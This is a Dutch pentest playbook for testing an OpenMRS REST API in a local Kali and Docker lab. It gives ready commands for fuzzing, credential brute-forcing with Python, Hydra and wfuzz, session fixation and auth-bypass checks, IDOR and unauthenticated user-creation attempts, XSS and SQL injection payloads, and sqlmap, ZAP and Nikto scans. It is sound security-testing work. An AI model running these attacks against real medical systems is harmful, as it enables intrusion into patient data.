# Pentest Playbook — OpenMRS REST Webservices (Kali Linux)

Methodologie: recon → enumeration → authenticatie → autorisatie → injection → configuratie → DAST  
Alle commando's zijn getest op Kali Linux 2024.x (bash).

---

## 0. Voorbereiding

### 0.1 Benodigde tools installeren

```bash
sudo apt update
sudo apt install -y \
  nmap curl ffuf gobuster nikto hydra wfuzz sqlmap \
  zaproxy whatweb wafw00f python3-requests seclists

# SecLists controleren (wordlists staan na installatie hier):
ls /usr/share/seclists/Discovery/Web-Content/
```

### 0.2 Target IP bepalen

OpenMRS draait als Docker container op je Windows-host. Kali draait als VM — je hebt
het IP van de Windows-host nodig, niet `localhost`.

```bash
# Optie A — VirtualBox NAT: gateway is altijd de Windows-host
ip route | grep default
# Uitvoer: default via 10.0.2.2 dev eth0 → TARGET=10.0.2.2

# Optie B — VirtualBox Host-Only / VMware:
ip route | grep default
# Bijv: default via 192.168.56.1 → TARGET=192.168.56.1

# Optie C — Windows PowerShell (run op Windows-host):
# ipconfig  →  zoek "Ethernet adapter vEthernet" of "VirtualBox Host-Only"
```

### 0.3 Omgevingsvariabelen instellen

Voer dit eenmalig uit aan het begin van elke Kali-sessie:

```bash
export TARGET="10.0.2.2"          # ← vervang door jouw IP (zie 0.2)
export PORT="8080"                 # poort waarop OpenMRS draait
export BASE="http://$TARGET:$PORT/openmrs"
export WSBASE="$BASE/ws/rest/v1"
export CREDS="admin:Admin1234"

# Connectiviteitscheck:
curl -sf "$WSBASE/session" | python3 -m json.tool
# Verwacht: {"authenticated":false,"sessionId":"..."}
```

---

## Fase 1 — Reconnaissance & Enumeration

### 1.1 Poortinventarisatie (Nmap)

```bash
# Snel overzicht van relevante poorten:
nmap -sV -sC -p 80,443,8080,8443,5432,15672 $TARGET -oN nmap-services.txt

# Volledige scan (duurt 5-10 min):
nmap -sV -p- --min-rate 1000 $TARGET -oN nmap-full.txt

# HTTP-specifieke scripts:
nmap -p $PORT --script http-headers,http-title,http-methods,http-auth-finder \
     $TARGET -oN nmap-http.txt

cat nmap-services.txt
```

**Noteer:** open poorten, versies, of er een reverse proxy voor zit.

---

### 1.2 Technologie-fingerprinting

```bash
# WhatWeb — automatische technologie-detectie:
whatweb "$BASE" --color=always

# HTTP headers handmatig inspecteren:
curl -sI "$WSBASE/session"

# WAF detectie:
wafw00f "$BASE"

# OpenSSL TLS-check (als HTTPS beschikbaar op 8443):
openssl s_client -connect $TARGET:8443 -servername $TARGET < /dev/null 2>/dev/null \
  | grep -E "Protocol|Cipher|subject|issuer"
```

**Wat ontbreekt typisch bij OpenMRS:**
`X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Strict-Transport-Security`

---

### 1.3 Endpoint discovery met ffuf

```bash
# Maak een OpenMRS-specifieke wordlist:
cat > /tmp/openmrs-endpoints.txt << 'EOF'
session
patient
person
encounter
obs
concept
user
role
privilege
location
provider
order
drug
visit
cohort
form
systeminformation
systemsetting
module
serverlog
hl7
alert
appointment
queue
taskdefinition
EOF

# Stap 1 — scan de REST API met onze wordlist:
ffuf -u "$WSBASE/FUZZ" \
     -w /tmp/openmrs-endpoints.txt \
     -mc 200,201,301,302,401,403 \
     -t 10 -v

# Stap 2 — bredere scan met SecLists (vindt ongedocumenteerde endpoints):
ffuf -u "$WSBASE/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt \
     -mc 200,301,401,403 \
     -fc 404,500 \
     -t 20 -rate 50 \
     -o /tmp/ffuf-wsrest.json -of json

# Stap 3 — module/admin-paden:
ffuf -u "$BASE/module/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt \
     -mc 200,301,302,403 \
     -fc 404 \
     -t 15 \
     -o /tmp/ffuf-module.json -of json

# Stap 4 — subpaden van /session (diag, debug, etc.):
ffuf -u "$WSBASE/session/FUZZ" \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,201,401,403 \
     -fc 404 \
     -t 10

# Resultaten bekijken:
cat /tmp/ffuf-wsrest.json | python3 -c \
  "import sys,json; [print(r['status'],r['url']) for r in json.load(sys.stdin).get('results',[])]"
```

**Alternatief met gobuster (ook pre-installed op Kali):**

```bash
gobuster dir -u "$WSBASE" \
             -w /usr/share/seclists/Discovery/Web-Content/common.txt \
             -s 200,201,301,302,401,403 \
             -t 20 -q
```

---

### 1.4 Swagger / API Explorer vinden

```bash
# Test bekende OpenMRS Swagger-paden:
for path in \
  "module/webservices/rest/apiExplorer.htm" \
  "module/webservices/rest/apidocs.htm" \
  "ws/rest/v1/swagger.json" \
  "swagger-ui.html" \
  "api-docs" \
  "module/webservices/rest/swagger.json"
do
  code=$(curl -so /dev/null -w "%{http_code}" "$BASE/$path")
  [ "$code" != "404" ] && echo "[$code]  $BASE/$path"
done
```

---

### 1.5 Diag / debug endpoints (voorbereiding voor PT-1)

```bash
# Subpaden van /session — zoek naar diagnostics-endpoints:
for sub in diag debug info status health version config dump; do
  code=$(curl -so /dev/null -w "%{http_code}" "$WSBASE/session/$sub")
  [ "$code" != "404" ] && echo "[$code]  $WSBASE/session/$sub"
done

# Systeem-informatie endpoint:
curl -s "$WSBASE/systeminformation" | python3 -m json.tool 2>/dev/null | head -30
```

---

## Fase 2 — Authenticatie-aanvallen

### 2.1 Default credentials checken

```bash
# Schrijf credentials naar een bestand voor hergebruik:
cat > /tmp/openmrs-creds.txt << 'EOF'
admin:Admin1234
admin:admin
admin:password
admin:test
admin:openmrs
system:System1234
daemon:Daemon1234
nurse:Nurse1234
doctor:Doctor1234
EOF

# Test alle combinaties:
while IFS=: read -r user pass; do
  result=$(curl -sf -u "$user:$pass" "$WSBASE/session" \
    | python3 -c "import sys,json; print(json.load(sys.stdin).get('authenticated','err'))" 2>/dev/null)
  echo "$user:$pass  →  authenticated: $result"
done < /tmp/openmrs-creds.txt
```

---

### 2.2 Brute-force / geen rate limiting (C1 / CWE-307)

```bash
# --- Methode A: Python PoC ---
# Schrijf het script naar een bestand (TARGET/PORT worden ingelezen als env vars):
cat > /tmp/brute_ratelimit.py << 'PYEOF'
#!/usr/bin/env python3
import requests, time, os, sys

target = os.environ.get("TARGET", "127.0.0.1")
port   = os.environ.get("PORT",   "8080")
url    = f"http://{target}:{port}/openmrs/ws/rest/v1/session"

print(f"[*] Doel: {url}")
print("[*] Verwacht bij goede beveiliging: 429 na ~10 pogingen\n")

blocked = False
for i in range(1, 51):
    start = time.time()
    try:
        r = requests.get(url, auth=("admin", f"foutWW{i}"), timeout=5)
        elapsed = time.time() - start
        if r.status_code == 429:
            print(f"[+] Rate limiting ACTIEF — geblokkeerd na {i} pogingen (429)")
            blocked = True
            break
        auth = r.json().get("authenticated", "?")
        print(f"Request {i:2d}: HTTP {r.status_code}  auth={auth}  {elapsed:.2f}s")
    except Exception as e:
        print(f"Request {i:2d}: FOUT — {e}")
    time.sleep(0.2)

if not blocked:
    print(f"\n[!] KWETSBAAR: {i} pogingen verstuurd, nooit geblokkeerd → CWE-307 bevestigd")
PYEOF

python3 /tmp/brute_ratelimit.py

# --- Methode B: Hydra ---
cat > /tmp/passwords.txt << 'EOF'
Admin1234
admin
password
test123
openmrs
Admin123
Password1
Welkom01
EOF

hydra -l admin -P /tmp/passwords.txt \
      -s $PORT \
      http-get://$TARGET/openmrs/ws/rest/v1/session \
      -t 4 -w 3 -V 2>&1 | tee /tmp/hydra-output.txt

# --- Methode C: wfuzz ---
wfuzz -c \
      -z file,/tmp/passwords.txt \
      --basic "admin:FUZZ" \
      -u "$WSBASE/session" \
      --hc 404 -t 5
```

**Verwachte uitkomst:** geen 429 na 50 pogingen → rate limiting ontbreekt.

---

### 2.3 Session Fixation (H3 / CWE-384)

```bash
echo "=== Stap 1: haal unauthenticated sessie-ID op ==="
SESSION_VOOR=$(curl -sc /tmp/cookies_voor.txt -s "$WSBASE/session" \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('sessionId','GEEN'))")
echo "Sessie-ID VOOR login: $SESSION_VOOR"

echo ""
echo "=== Stap 2: log in MET datzelfde sessie-ID ==="
SESSION_NA=$(curl -sb /tmp/cookies_voor.txt -sc /tmp/cookies_na.txt \
  -u "$CREDS" -s "$WSBASE/session" \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('sessionId','GEEN'))")
echo "Sessie-ID NA  login: $SESSION_NA"

echo ""
if [ "$SESSION_VOOR" = "$SESSION_NA" ]; then
  echo "[!] SESSION FIXATION BEVESTIGD — ID niet geroteerd na authenticatie (CWE-384)"
else
  echo "[+] ID is geroteerd — session fixation NIET aanwezig"
fi
```

---

### 2.4 Auth Bypass — missing return na sendError (C1 / CWE-302)

```bash
echo "=== Stap 1: haal geldig sessie-ID op ==="
GELDIG_SESSION=$(curl -s -u "$CREDS" "$WSBASE/session" \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('sessionId',''))")
echo "Geldig ID: $GELDIG_SESSION"

# Corrupteer de laatste 4 tekens (simuleert verlopen/ongeldig sessie):
NEP_SESSION="${GELDIG_SESSION:0:-4}XXXX"
echo "Nep-ID:    $NEP_SESSION"

echo ""
echo "=== Stap 2: request met verlopen sessie-ID ==="
curl -v -b "JSESSIONID=$NEP_SESSION" "$WSBASE/session" 2>&1 \
  | grep -E "^< HTTP|authenticated|sessionId"

echo ""
echo "=== Stap 3: probeer patiëntdata te lezen met verlopen ID ==="
curl -s -b "JSESSIONID=$NEP_SESSION" "$WSBASE/patient?limit=1" \
  | python3 -m json.tool 2>/dev/null

echo ""
echo "=== Baseline: volledig onbekend ID (verwacht: lege of 401 response) ==="
curl -s -b "JSESSIONID=VOLLEDIGONBEKEND123" "$WSBASE/patient?limit=1" \
  | python3 -m json.tool 2>/dev/null
```

**Wat je zoekt:** HTTP 200 body met data terwijl het sessie-ID verlopen is → bypass.

---

## Fase 3 — Autorisatie & Access Control

### 3.1 Info disclosure via /session/diag (M1 / CWE-200)

```bash
echo "=== Test 1: zonder authenticatie ==="
curl -s "$WSBASE/session/diag" | python3 -m json.tool

echo ""
echo "=== Test 2: met ongeldige credentials ==="
curl -s -u "onbekend:fout" "$WSBASE/session/diag" | python3 -m json.tool

echo ""
echo "=== Baseline: met geldige credentials ==="
curl -s -u "$CREDS" "$WSBASE/session/diag" | python3 -m json.tool
```

**Kwetsbaar als:** `userRoles` of `userPrivileges` zichtbaar zijn zonder geldige auth.

---

### 3.2 IDOR — toegang tot patiëntdata zonder authenticatie

```bash
# Stap 1: haal UUIDs op als admin:
curl -s -u "$CREDS" "$WSBASE/patient?limit=5" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
for p in data.get('results', []):
    print(p.get('uuid','?'))
" > /tmp/patient_uuids.txt

echo "Gevonden UUIDs:"
cat /tmp/patient_uuids.txt

# Stap 2: probeer diezelfde records ZONDER auth:
echo ""
echo "=== Toegang zonder auth ==="
while read uuid; do
  code=$(curl -so /dev/null -w "%{http_code}" "$WSBASE/patient/$uuid")
  echo "[$code]  $WSBASE/patient/$uuid"
done < /tmp/patient_uuids.txt
```

---

### 3.3 Verticale privilege escalation — admin endpoints zonder auth

```bash
echo "=== Admin endpoints benaderen zonder auth ==="
for ep in user role privilege systemsetting module serverlog; do
  code=$(curl -so /dev/null -w "%{http_code}" "$WSBASE/$ep")
  echo "[$code]  $WSBASE/$ep"
done

echo ""
echo "=== Probeer gebruiker aan te maken zonder auth ==="
curl -s -X POST "$WSBASE/user" \
     -H "Content-Type: application/json" \
     -d '{"username":"testpwn","password":"Test1234","person":{"names":[{"givenName":"pwn","familyName":"test"}]}}' \
  | python3 -m json.tool 2>/dev/null
```

---

## Fase 4 — Injection

### 4.1 Reflected XSS via Swagger (H1 / CWE-79)

```bash
# Schrijf XSS-payloads naar bestand (voorkomt problemen met bash-speciale tekens):
cat > /tmp/xss_payloads.txt << 'EOF'
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
javascript:alert(1)
EOF

# Test elke payload:
while IFS= read -r payload; do
  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
  url="$BASE/module/webservices/rest/apidocs.htm?callback=$encoded"
  curl -so /tmp/xss_resp.html -w "" "$url"
  # Controleer of payload ongefilterd terugkomt in de response:
  if grep -qF "$payload" /tmp/xss_resp.html 2>/dev/null; then
    echo "[!] REFLECTED — payload gevonden in response: ${payload:0:50}"
  else
    echo "[ ] niet gereflecteerd: ${payload:0:50}"
  fi
done < /tmp/xss_payloads.txt
```

---

### 4.2 SQL Injection — oriënterend (SQLMap)

```bash
# Schrijf SQLi-payloads naar bestand:
cat > /tmp/sqli_payloads.txt << 'EOF'
'
' OR '1'='1
' OR 1=1--
1 AND SLEEP(3)--
EOF

# Handmatig — check statuscode en responstijd:
while IFS= read -r payload; do
  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
  start=$(date +%s%N)
  code=$(curl -so /dev/null -w "%{http_code}" -u "$CREDS" "$WSBASE/patient?q=$encoded")
  elapsed=$(( ($(date +%s%N) - start) / 1000000 ))
  echo "[$code] ${elapsed}ms  payload: $payload"
done < /tmp/sqli_payloads.txt

# Geautomatiseerd met SQLMap:
sqlmap -u "$WSBASE/patient?q=test" \
       --auth-type=Basic \
       --auth-cred="$CREDS" \
       --level=2 --risk=1 \
       --technique=BEUSTQ \
       --batch \
       -p q \
       --output-dir=/tmp/sqlmap-output
```

---

### 4.3 Log Injection verificatie (al gemitigeerd — commit 831dafb)

```bash
# Test of gesanitiseerde input niet als logregel wordt geïnjecteerd:
curl -s -u "admin%0aINJECTED_LOG_LINE:Admin1234" "$WSBASE/session" \
  | python3 -m json.tool 2>/dev/null

# Controleer in de container-logs of de fake logregel verschijnt:
# (run op Windows-host, niet in Kali)
# docker compose logs openmrs 2>&1 | grep "INJECTED_LOG_LINE"
# Verwacht: niets → mitigatie werkt
```

---

### 4.4 Integer Overflow in paging parameters (I1 / CWE-190)

```bash
echo "=== Paging overflow tests ==="
for param in \
  "limit=0" \
  "limit=-1" \
  "limit=2147483647" \
  "limit=2147483648" \
  "limit=9999999999" \
  "startIndex=-1" \
  "startIndex=2147483648"
do
  code=$(curl -so /tmp/paging_resp.json -w "%{http_code}" -u "$CREDS" \
    "$WSBASE/patient?$param")
  err=$(python3 -c \
    "import sys,json; d=json.load(open('/tmp/paging_resp.json')); \
     print(d.get('error',{}).get('code','ok'))" 2>/dev/null)
  echo "[$code] $err  ←  $param"
done
```

---

## Fase 5 — Configuratie & Informatielekken

### 5.1 Security headers analyse

```bash
echo "=== Security headers op /session ==="
curl -sI "$WSBASE/session" | grep -iE \
  "x-content-type|x-frame|content-security|strict-transport|x-xss|cache-control|server|x-powered"

echo ""
echo "=== Verwachte headers (hardened config) ==="
echo "  X-Content-Type-Options: nosniff"
echo "  X-Frame-Options: DENY"
echo "  Content-Security-Policy: ..."
echo "  Strict-Transport-Security: ... (alleen HTTPS)"
```

---

### 5.2 Versie-informatie disclosure

```bash
# OpenMRS- en module-versies opvragen:
echo "=== Systeem-informatie ==="
curl -s -u "$CREDS" "$WSBASE/systeminformation" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
info = d.get('systemInfo', {})
for k, v in info.items():
    if 'version' in k.lower() or 'openmrs' in k.lower():
        print(f'{k}: {v}')
" 2>/dev/null

echo ""
echo "=== Module-versies ==="
curl -s -u "$CREDS" "$WSBASE/module" \
  | python3 -c "
import sys, json
for m in json.load(sys.stdin).get('results', []):
    print(m.get('moduleId','?'), m.get('version','?'))
" 2>/dev/null
```

---

### 5.3 Gevoelige data in logs (L1 / CWE-532)

```bash
# Trigger de LayoutTemplateProvider logging:
curl -s -u "$CREDS" "$BASE/module/webservices/rest/apiExplorer.htm" -o /dev/null

# Zoek naar gevoelige waarden in container-logs:
# (commando uit te voeren op Windows-host via PowerShell)
echo "Voer dit uit op de Windows-host (PowerShell):"
echo '  docker compose logs openmrs 2>&1 | Select-String -Pattern "password|secret|key|token"'
```

---

## Fase 6 — Geautomatiseerde DAST (OWASP ZAP + Nikto)

```bash
# --- OWASP ZAP (native op Kali, geen Docker nodig) ---
# ZAP installeren als nog niet aanwezig:
sudo apt install zaproxy -y

# Passieve baseline scan (veilig — geen actieve aanvallen):
zaproxy -daemon \
        -port 8090 \
        -host 127.0.0.1 \
        -config api.disablekey=true &
ZAP_PID=$!
sleep 15   # wacht tot ZAP opgestart is

# Voer quick scan uit via ZAP API:
curl -s "http://127.0.0.1:8090/JSON/spider/action/scan/?url=$WSBASE&maxChildren=10&recurse=true"
sleep 30   # wacht op spider

# Genereer HTML-rapport:
curl -s "http://127.0.0.1:8090/OTHER/core/other/htmlreport/" \
     -o /tmp/zap-report.html
echo "[+] ZAP rapport opgeslagen: /tmp/zap-report.html"

kill $ZAP_PID 2>/dev/null

# --- Nikto (aanvullende webserver-checks) ---
nikto -h "$BASE" \
      -output /tmp/nikto-report.txt \
      -Format txt \
      -maxtime 300 \
      -Tuning 1,2,3,4,5,6,7,9

echo ""
echo "=== Nikto samenvatting ==="
grep -E "^\+" /tmp/nikto-report.txt | head -20
```

---

## Resultaten vastleggen

Maak per test een notitie in dit formaat:

```
Bevinding : [naam, bv. "H2 — Geen rate limiting"]
Datum/tijd: [bv. 2026-06-12 14:32]
Commando  : [exact gebruikte commando]
Status    : [HTTP-code]
Output    : [fragment van de response / terminal-output]
Conclusie : KWETSBAAR / NIET KWETSBAAR / ONDUIDELIJK
Screenshot: [bestandsnaam indien aanwezig]
```

---

## Uitvoervolgorde (checklijst)

```
[ ] 0.1  Tools installeren (apt)
[ ] 0.2  TARGET IP bepalen vanuit Kali
[ ] 0.3  Omgevingsvariabelen instellen + connectiviteitscheck

[ ] 1.1  Nmap portscan
[ ] 1.2  WhatWeb + wafw00f fingerprinting + HTTP headers
[ ] 1.3  ffuf endpoint discovery (REST + module-paden)
[ ] 1.4  Swagger / API Explorer localiseren
[ ] 1.5  Diag/debug subpaden van /session

[ ] 2.1  Default credentials checken
[ ] 2.2  Brute-force / rate limiting (Python PoC + Hydra) → H2
[ ] 2.3  Session fixation                                  → H3
[ ] 2.4  Auth bypass (verlopen sessie-ID)                  → C1

[ ] 3.1  /session/diag zonder auth                         → M1
[ ] 3.2  IDOR op patiënt-endpoints
[ ] 3.3  Verticale privilege escalation (admin endpoints)

[ ] 4.1  Reflected XSS via Swagger-parameter              → H1
[ ] 4.2  SQL injection oriëntatie + SQLMap
[ ] 4.3  Log injection verificatie (verwacht: gemitigeerd)
[ ] 4.4  Integer overflow paging parameters                → I1

[ ] 5.1  Security headers analyse
[ ] 5.2  Versie-informatie disclosure
[ ] 5.3  Gevoelige log-output controleren                  → L1

[ ] 6.   OWASP ZAP baseline scan
[ ] 6.   Nikto webserver-check
```
